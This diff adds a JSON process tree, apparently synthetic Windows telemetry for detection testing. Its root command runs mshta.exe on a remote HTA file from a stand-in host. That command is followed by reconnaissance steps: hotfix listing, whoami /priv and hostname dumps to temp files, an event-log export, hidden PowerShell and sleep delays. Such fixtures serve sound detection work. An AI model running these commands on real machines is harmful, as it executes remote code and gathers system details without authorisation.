@@ -1,0 +1,228 @@
+{
+  "pid": 241243,
+  "ppid": 0,
+  "name": "explorer.exe",
+  "command": "explorer.exe",
+  "children": [
+    {
+      "pid": 241245,
+      "ppid": 241243,
+      "name": "cmd.exe",
+      "command": "cmd.exe /c \"mshta.exe \"http://cdn.contoso-updates.com/diag/collect.hta\"\"",
+      "children": [
+        {
+          "pid": 241251,
+          "ppid": 241245,
+          "name": "timeout.exe",
+          "command": "timeout.exe /t 8 /nobreak",
+          "children": [
+            {
+              "pid": 241258,
+              "ppid": 241251,
+              "name": "wmic.exe",
+              "command": "wmic.exe qfe get HotFixID,InstalledOn",
+              "children": [
+                {
+                  "pid": 241263,
+                  "ppid": 241258,
+                  "name": "hostname.exe",
+                  "command": "hostname.exe",
+                  "children": [
+                    {
+                      "pid": 241269,
+                      "ppid": 241263,
+                      "name": "timeout.exe",
+                      "command": "timeout.exe /t 21 /nobreak",
+                      "children": [
+                        {
+                          "pid": 241273,
+                          "ppid": 241269,
+                          "name": "choice.exe",
+                          "command": "choice.exe /d y /t 12 > nul",
+                          "children": [
+                            {
+                              "pid": 241276,
+                              "ppid": 241273,
+                              "name": "choice.exe",
+                              "command": "choice.exe /d y /t 16 > nul",
+                              "children": []
+                            }
+                          ]
+                        }
+                      ]
+                    },
+                    {
+                      "pid": 241278,
+                      "ppid": 241263,
+                      "name": "wevtutil.exe",
+                      "command": "wevtutil.exe epl \"Microsoft-Windows-TaskScheduler/Operational\" \"C:\\ProgramData\\Woodgrove\\Logs\\Microsoft-Windows-TaskScheduler_Operational_cf33818d.evtx\"",
+                      "children": [
+                        {
+                          "pid": 241281,
+                          "ppid": 241278,
+                          "name": "hostname.exe",
+                          "command": "hostname.exe > \"C:\\Users\\ananya.singh\\AppData\\Local\\Temp\\host_17c52e0d.txt\"",
+                          "children": [
+                            {
+                              "pid": 241288,
+                              "ppid": 241281,
+                              "name": "powershell.exe",
+                              "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Process -FilePath 'timeout.exe' -ArgumentList '/t 10 /nobreak' -Wait\"",
+                              "children": [
+                                {
+                                  "pid": 241292,
+                                  "ppid": 241288,
+                                  "name": "hostname.exe",
+                                  "command": "hostname.exe",
+                                  "children": [
+                                    {
+                                      "pid": 241297,
+                                      "ppid": 241292,
+                                      "name": "findstr.exe",
+                                      "command": "findstr.exe /i \"ERROR\" \"C:\\ProgramData\\BlueYonder\\Logs\\deploy.log\"",
+                                      "children": [
+                                        {
+                                          "pid": 241301,
+                                          "ppid": 241297,
+                                          "name": "hostname.exe",
+                                          "command": "hostname.exe",
+                                          "children": [
+                                            {
+                                              "pid": 241306,
+                                              "ppid": 241301,
+                                              "name": "whoami.exe",
+                                              "command": "whoami.exe /priv > \"C:\\Users\\ananya.singh\\AppData\\Local\\Temp\\who_e0b5868d.txt\"",
+                                              "children": [
+                                                {
+                                                  "pid": 241310,
+                                                  "ppid": 241306,
+                                                  "name": "whoami.exe",
+                                                  "command": "whoami.exe /priv",
+                                                  "children": [
+                                                    {
+                                                      "pid": 241317,
+                                                      "ppid": 241310,
+                                                      "name": "choice.exe",
+                                                      "command": "choice.exe /d y /t 12 > nul",
+                                                      "children": [
+                                                        {
+                                                          "pid": 241321,
+                                                          "ppid": 241317,
+                                                          "name": "hostname.exe",
+                                                          "command": "hostname.exe > \"C:\\Users\\ananya.singh\\AppData\\Local\\Temp\\host_c5b51169.txt\"",
+                                                          "children": []
+                                                        }
+                                                      ]
+                                                    }
+                                                  ]
+                                                }
+                                              ]
+                                            },
+                                            {
+                                              "pid": 241325,
+                                              "ppid": 241301,
+                                              "name": "hostname.exe",
+                                              "command": "hostname.exe",
+                                              "children": [
+                                                {
+                                                  "pid": 241327,
+                                                  "ppid": 241325,
+                                                  "name": "whoami.exe",
+                                                  "command": "whoami.exe > \"C:\\Users\\ananya.singh\\AppData\\Local\\Temp\\who_8f8ae141.txt\"",
+                                                  "children": [
+                                                    {
+                                                      "pid": 241333,
+                                                      "ppid": 241327,
+                                                      "name": "timeout.exe",
+                                                      "command": "timeout.exe /t 14 /nobreak",
+                                                      "children": [
+                                                        {
+                                                          "pid": 241334,
+                                                          "ppid": 241333,
+                                                          "name": "ping.exe",
+                                                          "command": "ping.exe -n 8 127.0.0.1 > nul",
+                                                          "children": [
+                                                            {
+                                                              "pid": 241337,
+                                                              "ppid": 241334,
+                                                              "name": "timeout.exe",
+                                                              "command": "timeout.exe /t 2 /nobreak",
+                                                              "children": [
+                                                                {
+                                                                  "pid": 241340,
+                                                                  "ppid": 241337,
+                                                                  "name": "whoami.exe",
+                                                                  "command": "whoami.exe /priv",
+                                                                  "children": []
+                                                                }
+                                                              ]
+                                                            }
+                                                          ]
+                                                        }
+                                                      ]
+                                                    }
+                                                  ]
+                                                },
+                                                {
+                                                  "pid": 241342,
+                                                  "ppid": 241325,
+                                                  "name": "hostname.exe",
+                                                  "command": "hostname.exe",
+                                                  "children": [
+                                                    {
+                                                      "pid": 241343,
+                                                      "ppid": 241342,
+                                                      "name": "hostname.exe",
+                                                      "command": "hostname.exe > \"C:\\Users\\ananya.singh\\AppData\\Local\\Temp\\host_663824f6.txt\"",
+                                                      "children": [
+                                                        {
+                                                          "pid": 241346,
+                                                          "ppid": 241343,
+                                                          "name": "whoami.exe",
+                                                          "command": "whoami.exe > \"C:\\Users\\ananya.singh\\AppData\\Local\\Temp\\who_07584f7d.txt\"",
+                                                          "children": [
+                                                            {
+                                                              "pid": 241353,
+                                                              "ppid": 241346,
+                                                              "name": "whoami.exe",
+                                                              "command": "whoami.exe /priv > \"C:\\Users\\ananya.singh\\AppData\\Local\\Temp\\who_568a43b6.txt\"",
+                                                              "children": [
+                                                                {
+                                                                  "pid": 241359,
+                                                                  "ppid": 241353,
+                                                                  "name": "hostname.exe",
+                                                                  "command": "hostname.exe",
+                                                                  "children": []
+                                                                }
+                                                              ]
+                                                            }
+                                                          ]
+                                                        }
+                                                      ]
+                                                    }
+                                                  ]
+                                                }
+                                              ]
+                                            }
+                                          ]
+                                        }
+                                      ]
+                                    }
+                                  ]
+                                }
+                              ]
+                            }
+                          ]
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
